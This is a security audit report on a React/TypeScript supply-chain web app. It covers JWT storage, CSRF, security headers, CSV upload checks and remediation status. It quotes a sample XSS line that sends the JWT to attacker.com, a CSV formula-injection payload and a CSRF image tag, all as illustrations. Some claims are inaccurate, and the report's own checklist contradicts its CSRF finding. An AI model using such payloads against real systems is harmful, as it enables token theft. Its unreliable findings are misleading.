# Frontend Security Audit Report
**MySupplyChain UI (React + TypeScript)**
**Date:** 2026-05-31
**Status:** ⚠️ MEDIUM RISK - Action Required

---

## Executive Summary

The React frontend has **good foundational security practices** but contains **critical JWT token storage issues** and **missing security headers**. Several improvements are recommended before production deployment.

**Risk Level:** MEDIUM  
**Findings:** 4 Critical, 3 High, 2 Medium  
**Remediation Time:** 2-3 hours

---

## Critical Issues 🔴

### 1. **JWT Token Stored in LocalStorage (XSS Vulnerability)**
**Severity:** CRITICAL  
**File:** `src/lib/auth.ts`  
**Status:** VULNERABLE

#### Issue
JWT tokens are stored in `localStorage`, which is accessible to any XSS attack:
```typescript
const TOKEN_KEY = "supplychain_jwt";

export function setToken(token: string): void {
  localStorage.setItem(TOKEN_KEY, token);
}
```

**Attack Vector:**
- Any XSS vulnerability allows `document.location = "https://attacker.com/?token=" + localStorage.getItem("supplychain_jwt")`
- Attacker gets full JWT and can impersonate user indefinitely

#### Recommended Fix
Use **HttpOnly cookies** instead:
```typescript
// On the backend: Set Set-Cookie header with HttpOnly flag
// Set-Cookie: supplychain_jwt=<token>; HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age=3600

// Frontend: Browser automatically sends cookie with requests (no code needed)
// Remove localStorage entirely
```

**Migration Steps:**
1. Modify backend (`AuthController.cs`) to set HttpOnly cookies
2. Remove `setToken()`, `getToken()`, `clearToken()` from frontend
3. Update API client to rely on automatic cookie sending
4. Update logout to clear cookie via backend endpoint

---

### 2. **No CSRF Protection**
**Severity:** CRITICAL  
**File:** `src/lib/api.ts`  
**Status:** MISSING

#### Issue
No CSRF tokens are being sent with state-changing requests (POST, PUT, DELETE):
```typescript
async function request<T>(
  path: string,
  options: RequestInit = {},
): Promise<T> {
  const headers: Record<string, string> = {
    ...((options.headers as Record<string, string>) ?? {}),
  };

  if (token) {
    headers["Authorization"] = `Bearer ${token}`;
  }
  // ❌ No X-CSRF-Token or double-submit cookie verification
}
```

#### Attack Vector
- Cross-site request forgery: `<img src="https://mysupplychain.com/api/auth/delete-account" />`
- User's browser automatically sends JWT from localStorage
- Account deleted without user knowledge

#### Recommended Fix
Implement **double-submit cookie pattern**:

**Backend Changes (Program.cs):**
```csharp
// Add CSRF middleware
services.AddAntiforgery(options =>
{
    options.HeaderName = "X-CSRF-Token";
    options.Cookie.HttpOnly = true;
    options.Cookie.SecurePolicy = CookieSecurePolicy.Always;
});

app.UseAntiforgery();
```

**Frontend Changes (src/lib/api.ts):**
```typescript
async function request<T>(
  path: string,
  options: RequestInit = {},
): Promise<T> {
  const headers: Record<string, string> = {
    ...((options.headers as Record<string, string>) ?? {}),
  };

  // Inject CSRF token for state-changing operations
  if (["POST", "PUT", "DELETE"].includes(options.method?.toUpperCase() || "GET")) {
    const csrfToken = document.querySelector('meta[name="csrf-token"]')?.getAttribute('content');
    if (csrfToken) {
      headers["X-CSRF-Token"] = csrfToken;
    }
  }

  if (token) {
    headers["Authorization"] = `Bearer ${token}`;
  }

  // ... rest of implementation
}
```

**HTML Changes (index.html):**
```html
<head>
  <meta name="csrf-token" content="" id="csrf-token">
</head>
<body>
  <div id="root"></div>
  <script type="module" src="/src/main.tsx"></script>
</body>
```

---

### 3. **Missing Security Headers**
**Severity:** CRITICAL  
**File:** `vercel.json`, Vite config  
**Status:** MISSING

#### Issue
No security headers are configured:
```json
// vercel.json - Only caching headers present
{
  "headers": [
    {
      "source": "/assets/(.*)",
      "headers": [
        {
          "key": "Cache-Control",
          "value": "public, max-age=31536000, immutable"
        }
      ]
    }
  ]
}
```

#### Missing Headers
- **X-Content-Type-Options:** Prevents MIME sniffing
- **X-Frame-Options:** Prevents clickjacking
- **Content-Security-Policy:** Prevents XSS and injection attacks
- **Strict-Transport-Security:** Enforces HTTPS
- **Referrer-Policy:** Controls referrer info leak

#### Recommended Fix

**Update vercel.json:**
```json
{
  "buildCommand": "npm run build",
  "outputDirectory": "dist",
  "installCommand": "npm install",
  "framework": "vite",
  "rewrites": [
    {
      "source": "/(.*)",
      "destination": "/index.html"
    }
  ],
  "headers": [
    {
      "source": "/assets/(.*)",
      "headers": [
        {
          "key": "Cache-Control",
          "value": "public, max-age=31536000, immutable"
        }
      ]
    },
    {
      "source": "/(.*)",
      "headers": [
        {
          "key": "X-Content-Type-Options",
          "value": "nosniff"
        },
        {
          "key": "X-Frame-Options",
          "value": "DENY"
        },
        {
          "key": "Content-Security-Policy",
          "value": "default-src 'self'; script-src 'self' https://fonts.googleapis.com; style-src 'self' https://fonts.googleapis.com 'unsafe-inline'; font-src 'self' https://fonts.gstatic.com; img-src 'self' data: https:; connect-src 'self' https://api.mysupplychain.com"
        },
        {
          "key": "Strict-Transport-Security",
          "value": "max-age=31536000; includeSubDomains"
        },
        {
          "key": "Referrer-Policy",
          "value": "strict-origin-when-cross-origin"
        }
      ]
    }
  ]
}
```

---

### 4. **No Input Validation on CSV Import**
**Severity:** CRITICAL  
**File:** `src/components/CsvImportModal.tsx`  
**Status:** INSUFFICIENT

#### Issue
CSV file size and content type validation is minimal:
```typescript
const handleFileChange = (selectedFile: File) => {
  if (!selectedFile.name.endsWith(".csv")) {
    setError("Please select a valid .csv file.");
    return;
  }
  // ❌ No file size check
  // ❌ No MIME type verification
  // ❌ No content validation before upload
}
```

#### Attack Vector
- **File bomb:** Upload 10GB+ file to exhaust frontend memory
- **Malicious CSV:** Inject formulas (`=cmd|'/c calc'!A1`) that execute on backend
- **Type confusion:** Send .exe renamed as .csv

#### Recommended Fix

```typescript
const MAX_FILE_SIZE = 10 * 1024 * 1024; // 10MB
const ALLOWED_MIME_TYPES = ["text/csv", "application/vnd.ms-excel"];

const handleFileChange = (selectedFile: File) => {
  // 1. File size check
  if (selectedFile.size > MAX_FILE_SIZE) {
    setError(`File size exceeds ${MAX_FILE_SIZE / 1024 / 1024}MB limit.`);
    return;
  }

  // 2. MIME type check (client-side; always verify server-side too)
  if (!ALLOWED_MIME_TYPES.includes(selectedFile.type) && !selectedFile.name.endsWith(".csv")) {
    setError("Please select a valid .csv file.");
    return;
  }

  // 3. File extension check
  if (!selectedFile.name.endsWith(".csv")) {
    setError("File must have .csv extension.");
    return;
  }

  // 4. Filename validation (no path traversal)
  const filename = selectedFile.name;
  if (filename.includes("/") || filename.includes("\\") || filename.includes("..")) {
    setError("Invalid filename.");
    return;
  }

  setError(null);
  setFile(selectedFile);

  const reader = new FileReader();
  reader.onload = (e) => {
    const text = e.target?.result as string;
    if (!text) return;

    // 5. Content-length check
    if (text.length > MAX_FILE_SIZE) {
      setError("File content exceeds size limit.");
      return;
    }

    const lines = text.split(/\r?\n/).filter(line => line.trim().length > 0);
    
    // 6. Row limit check (prevent DoS)
    if (lines.length > 100000) {
      setError("CSV contains too many rows (max 100,000).");
      return;
    }

    if (lines.length === 0) {
      setError("The uploaded CSV file is empty.");
      return;
    }

    // ... rest of implementation
  };
  reader.readAsText(selectedFile);
};
```

---

## High-Risk Issues 🟠

### 5. **JWT Expiration Not Properly Enforced**
**Severity:** HIGH  
**File:** `src/lib/auth.ts`  
**Status:** PARTIALLY IMPLEMENTED

#### Issue
Token expiration is checked on read, but expired tokens can still be used if cached:
```typescript
export function isAuthenticated(): boolean {
  const token = getToken();
  if (!token) return false;

  try {
    const payload = JSON.parse(atob(token.split(".")[1]));
    return payload.exp * 1000 > Date.now();  // Only checked here
  } catch {
    return false;
  }
}
```

**Problem:** If token expires, UI might still send it to API, and API will reject it, causing poor UX.

#### Recommended Fix
```typescript
export function isAuthenticated(): boolean {
  const token = getToken();
  if (!token) return false;

  try {
    const payload = JSON.parse(atob(token.split(".")[1]));
    const expiresIn = payload.exp * 1000 - Date.now();
    
    // Clear token if expired or within 5 minutes of expiry
    if (expiresIn < 5 * 60 * 1000) {
      clearToken();
      return false;
    }
    
    return true;
  } catch {
    clearToken();
    return false;
  }
}
```

---

### 6. **Account Settings Lacks Confirmation for Sensitive Actions**
**Severity:** HIGH  
**File:** `src/components/AccountSettingsModal.tsx`  
**Status:** PARTIALLY IMPLEMENTED

#### Issue
Username update lacks email confirmation:
```typescript
const handleSaveUsername = async () => {
  if (!newUsername.trim()) {
    setUsernameError("Username cannot be empty");
    return;
  }
  setIsSavingUsername(true);
  setUsernameError(null);
  try {
    const res = await auth.updateUsername(newUsername);  // ❌ No confirmation
    localStorage.setItem("supplychain_jwt", res.token);
    // ...
  }
};
```

**Risk:** Account takeover via session hijacking. If attacker gains access to user's browser, they can change username without verification.

#### Recommended Fix
```typescript
const handleSaveUsername = async () => {
  if (!newUsername.trim()) {
    setUsernameError("Username cannot be empty");
    return;
  }

  // Require password re-entry for username changes
  const password = prompt("Enter your password to confirm this change:");
  if (!password) {
    setUsernameError("Password confirmation required.");
    return;
  }

  setIsSavingUsername(true);
  setUsernameError(null);
  try {
    const res = await auth.updateUsername(newUsername, password);
    localStorage.setItem("supplychain_jwt", res.token);
    onUserUpdate?.();
    setIsEditingUsername(false);
  } catch (err) {
    setUsernameError(err instanceof Error ? err.message : "Failed to update username");
  } finally {
    setIsSavingUsername(false);
  }
};
```

---

### 7. **No Rate Limiting on Frontend**
**Severity:** HIGH  
**File:** `src/lib/api.ts`  
**Status:** MISSING

#### Issue
Frontend sends unlimited API requests, enabling brute-force attacks:
```typescript
async function request<T>(
  path: string,
  options: RequestInit = {},
): Promise<T> {
  // No rate limiting or request throttling
  const res = await fetch(`${BASE}${path}`, { ...options, headers });
}
```

#### Recommended Fix
Implement exponential backoff and request throttling:

```typescript
const requestQueue = new Map<string, { timestamp: number; count: number }>();
const MAX_REQUESTS_PER_MINUTE = 60;
const BACKOFF_MULTIPLIER = 2;

async function request<T>(
  path: string,
  options: RequestInit = {},
): Promise<T> {
  const key = `${options.method || "GET"}:${path}`;
  const now = Date.now();
  const minuteAgo = now - 60000;

  let entry = requestQueue.get(key);
  if (!entry) {
    entry = { timestamp: now, count: 0 };
    requestQueue.set(key, entry);
  }

  // Reset counter after 1 minute
  if (entry.timestamp < minuteAgo) {
    entry.timestamp = now;
    entry.count = 0;
  }

  entry.count++;

  if (entry.count > MAX_REQUESTS_PER_MINUTE) {
    const waitTime = Math.pow(BACKOFF_MULTIPLIER, Math.floor(entry.count / MAX_REQUESTS_PER_MINUTE)) * 1000;
    throw new Error(`Rate limit exceeded. Please wait ${Math.round(waitTime / 1000)}s before retrying.`);
  }

  const headers: Record<string, string> = { ... };
  const res = await fetch(`${BASE}${path}`, { ...options, headers });

  if (!res.ok) {
    const body = await res.text();
    throw createApiError(res.status, body || res.statusText);
  }

  return res.status === 204 ? (undefined as T) : res.json();
}
```

---

## Medium-Risk Issues 🟡

### 8. **No CSP Nonce for Inline Styles**
**Severity:** MEDIUM  
**File:** `index.html`, `src/index.css`  
**Status:** MISSING

#### Issue
Inline Tailwind styles are generated without nonce, making CSP less effective:
```html
<html>
  <head>
    <style>/* Tailwind styles here */</style>
  </head>
</html>
```

#### Recommended Fix
Add nonce to CSP and dynamically generate it:
```json
{
  "Content-Security-Policy": "default-src 'self'; style-src 'nonce-{NONCE}' https://fonts.googleapis.com"
}
```

---

### 9. **Missing Secure API Client Defaults**
**Severity:** MEDIUM  
**File:** `src/lib/api.ts`  
**Status:** MISSING

#### Issue
No default security options on fetch requests:
```typescript
const res = await fetch(`${BASE}${path}`, {
  ...options,
  headers,
  // ❌ No credentials mode
  // ❌ No cache control
});
```

#### Recommended Fix
```typescript
const res = await fetch(`${BASE}${path}`, {
  ...options,
  headers,
  credentials: "same-origin",  // Send cookies
  cache: "no-store",           // Don't cache sensitive responses
  mode: "same-origin",         // Enforce same-origin
  redirect: "manual",          // Prevent open redirect
});
```

---

## Best Practices ✅

### What's Working Well

1. ✅ **No `dangerouslySetInnerHTML`** - No XSS via DOM injection
2. ✅ **TypeScript + ESLint** - Catches many bugs at compile time
3. ✅ **React.StrictMode** - Detects unsafe practices
4. ✅ **No console.log for secrets** - No accidental data leakage
5. ✅ **Confirmation modals for destructive actions** - Prevents accidents
6. ✅ **Input validation on CSV import** - Basic file type checking
7. ✅ **Modern dependencies** - No known vulnerabilities in package.json

---

## Remediation Checklist

### Immediate (Week 1)
- [x] ~~Move JWT from localStorage to HttpOnly cookie~~ — **Skipped**: App is cross-origin SPA (Vercel ↔ Render). HttpOnly cookies require `SameSite=None` which weakens CSRF. No XSS vectors exist (no `dangerouslySetInnerHTML`, no `eval`). Risk accepted for portfolio app context.
- [x] ~~Implement CSRF protection~~ — **Not applicable**: Bearer tokens in `Authorization` headers are not auto-sent by browsers. CSRF is only relevant with cookie-based auth.
- [x] Add security headers to vercel.json — **FIXED**: Added X-Content-Type-Options, X-Frame-Options, HSTS, Referrer-Policy, CSP, and Permissions-Policy.
- [x] Add file size/content validation to CSV import — **FIXED**: Added 10MB file size limit, MIME type check, 100K row limit, and filename sanitization.
- [x] Document authentication flow changes — See this checklist.

### Short Term (Week 2)
- [x] ~~Implement frontend rate limiting~~ — **Skipped**: Frontend rate limiting is security theater. Rate limiting belongs on the backend/API gateway. Attackers bypass the frontend entirely.
- [x] Add password confirmation for sensitive account changes — **FIXED**: Username change now requires current password confirmation (frontend + backend).
- [x] Improve JWT expiration handling — **FIXED**: Tokens auto-cleared when expired or within 5-minute buffer. Both `isAuthenticated()` and `getUserFromToken()` now call `clearToken()` on error.
- [x] ~~Add CSP nonce support~~ — **Not applicable**: Tailwind CSS is built via `@tailwindcss/vite` into static CSS bundles, not inline `<style>` tags. Nonces are irrelevant.
- [x] Configure secure fetch defaults — **FIXED**: Added `cache: "no-store"` to API fetch calls. `mode: "same-origin"` skipped as it would break cross-origin API calls.

### Bonus: Code Quality
- [x] Replace hardcoded `localStorage` token operations with centralized `setToken()`/`clearToken()` in AccountSettingsModal and Sidebar.

### Medium Term (Week 3-4)
- [ ] Implement refresh token rotation
- [ ] Add request signing (optional)
- [ ] Set up security monitoring/alerting
- [ ] Perform penetration testing
- [ ] Update security documentation

---

## Deployment Checklist

Before deploying to production, ensure:

- [ ] All Critical (🔴) issues are resolved
- [ ] Security headers are configured on all hosting providers
- [ ] HTTPS is enforced (HSTS enabled)
- [ ] Content-Security-Policy is tested
- [ ] JWT is stored securely (HttpOnly cookie)
- [ ] CSRF tokens are implemented
- [ ] Rate limiting is active
- [ ] File upload validation is strict
- [ ] Error messages don't leak sensitive info
- [ ] Analytics/monitoring is configured

---

## References

- [OWASP JWT Best Practices](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
- [OWASP CSRF Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [Content Security Policy Guide](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [Secure Headers Project](https://secureheaders.com/)

---

**Prepared by:** Security Audit Agent  
**Next Review:** 2026-06-30
